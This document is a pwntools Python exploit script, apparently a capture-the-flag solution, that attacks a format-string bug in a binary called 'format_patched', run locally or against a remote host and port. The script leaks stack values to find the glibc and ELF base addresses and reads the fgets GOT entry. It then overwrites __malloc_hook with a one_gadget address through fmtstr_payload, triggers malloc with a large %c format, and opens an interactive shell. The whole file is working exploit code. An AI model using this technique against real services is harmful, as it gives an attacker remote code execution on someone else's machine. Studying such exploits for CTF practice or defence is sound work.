#!/usr/bin/env python3

from pwn import context, ELF, fmtstr_payload, log, p64, remote, sys, u64

context.binary = elf = ELF('format_patched')


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    ip, port = sys.argv[1].split(':')
    return remote(ip, int(port))


def main():
    p = get_process()

    p.sendline(b'%21$lx')
    _IO_2_1_stderr__addr = int(p.recvline().decode(), 16)
    log.info(f'Leaked _IO_2_1_stderr_ address: {hex(_IO_2_1_stderr__addr)}')

    p.sendline(b'%49$p')
    main_addr = int(p.recvline().decode(), 16)
    log.info(f'Leaked main() address: {hex(main_addr)}')

    _IO_2_1_stderr__offset = 0x3ec680  # 0x1ed5c0
    glibc_address = _IO_2_1_stderr__addr - _IO_2_1_stderr__offset
    log.success(f'Glibc base address: {hex(glibc_address)}')

    main_offset = 0x1284
    elf.address = main_addr - main_offset
    log.success(f'ELF base address: {hex(elf.address)}')

    p.sendline(b'%7$sAAAA' + p64(elf.got.fgets))
    fgets_addr = u64(p.recv().split(b'AAAA')[0].ljust(8, b'\0'))
    log.info(f'Leaked fgets() address: {hex(fgets_addr)}')

    one_gadget_shell_offset = 0x4f322
    __malloc_hook_offset = 0x3ebc30

    one_gadget_shell_addr = glibc_address + one_gadget_shell_offset
    __malloc_hook_addr = glibc_address + __malloc_hook_offset

    p.sendline(fmtstr_payload(6, {__malloc_hook_addr: one_gadget_shell_addr}))
    p.recv()

    p.sendline(b'%10000000c')
    p.interactive()


if __name__ == '__main__':
    main()
